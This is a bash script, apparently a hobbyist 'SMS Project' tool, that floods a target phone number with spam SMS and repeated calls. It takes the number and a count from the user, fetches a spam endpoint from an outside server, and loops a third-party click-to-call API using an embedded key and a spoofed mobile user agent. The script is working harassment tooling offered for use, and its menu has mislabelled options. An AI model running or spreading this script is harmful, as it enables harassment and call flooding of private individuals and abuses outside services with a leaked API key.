#!/bin/bash

load(){
    echo -e "\n"
    bar="= = = = = = = = = = = = = = = = = = = = = = = ="
    barlength=${#bar}
    i=0
    while((i<100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.2
    done
}
get_sms=$(curl -s http://zlucifer.com/api/hackbae.php?request=sms)
callbomb(){
	curl -A "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5" -s "http://ex1.zeotel.com/c2c?key=aQVblBv5h18xhjLNAwZqrQ-1403256058&ac=14945&ph=$target" >>/dev/null
}
again(){
    echo "Do you want to use SMS Project again?" | festival --tts
    read -p " Do you want to use SMS Project Again? (y/n): " use
    if [ $use = "y" ]; then
            spam
    else
            clear
            cowsay -f koala " Thanks for using SMS Project!" | lolcat
            echo "Tanks for using SMS Project!" | festival --tts
    fi
}
#spam
spam(){
    clear
    echo "WELCOME TO S.M.S PROJECT!" | festival --tts
    cowsay -f sheep "SPAM SMS PROJECT"
    echo "Please choose a number!" | festival --tts
    echo
    echo " [1] Spam SMS"
    echo " [2] Spam Call"
    echo " [2] Exit"
    echo
    read -p " Choose number: " choose
    if [ $choose = "1" ]; then
            echo "You choosed number 1!" | festival --tts
            clear
            echo "SPAM SMS" | festival --tts
            figlet -f smslant "SPAM SMS"
            #function spam sms
            echo
            echo "Enter your target number!" | festival --tts
            read -p " Target number: " target
            echo "How many sms do you want to send? to" $target | festival --tts
            read -p " Count: " count
            echo "Please confirm if the information above is right!" | festival --tts
            read -p " Do the numbers "$target" send "$count" Right? (y/n): " confirm
            echo
            echo "Sending..." $count "to...." $target | festival --tts
            if [ $confirm = "y" ]; then
                    echo "Loading..." | festival --tts
                    load
                    clear
                    target_do=$get_sms'/sms.php?nomor='$target'&count='$count
                    CURL_RESPONSE=`curl -s -o /dev/null -w "%{http_code}" $target_do`
                    echo " #######################################"
                    echo " #    Spamming SMS to: "$target"     #"
                    echo " #######################################"
                    echo " #         Wait until done!            #"
                    echo " #######################################"
                    echo " #  Thanks for using the SMS Project   #"
                    echo " #         Have a nice day!            #"
                    echo " #            ~Mr. SuD0                #"
                    echo " #######################################"
            else
                    echo "Error, please try again!" | festival --tts
                    cowsay -f bunny " Error, please try again!" | lolcat
            fi

            again
        elif [ $choose == 2 ]; then
        echo "You choosed number 2!" | festival --tts
        clear
	figlet -f smslant "Call Spam" | lolcat
	echo " Call Spam!" | festival --tts
	echo
	echo "Enter the phone number!" | festival --tts
	read -p "Target Number: " target
	echo "Enter the number of times to call!" $target | festival --tts
	read -p "Count of Call: " count
		 for x in `seq 1 $count`; do
		 	callbomb
                        load
        		echo "Call..." $x "in process!" | festival --tts
		 	echo
                        echo "Call $x In Process"
		 	sleep 25
		 done
		 echo "Call bomb to..." $target "...has been done!" | festival --tts
         clear
         again

    elif [ $choose = "2" ]; then
        echo "You choosed number 3!" | festival --tts
        echo "Quiting application!!" | festival --tts
        clear
        echo "Thanks for using SMS Project!" | festival --tts
        cowsay -f koala " Thanks for using SMS Project!" | lolcat
        close
    else
        clear
        echo "Error, please try again!" | festival --tts
        cowsay -f bunny " Error, please try again!" | lolcat
        again
    fi
}
close(){
    exit
}
clear
cowsay -f flaming-sheep "Initializing Application..." | lolcat
echo "Initializing Application..." | festival --tts
load
clear
clear
cowsay -p vader Do you want to proceed? | lolcat
echo "Do you want to proceed?" | festival --tts
read -p " Launch Application? (y/n): " proceed
if [ $proceed = "y" ]; then
      spam
else
      close
fi
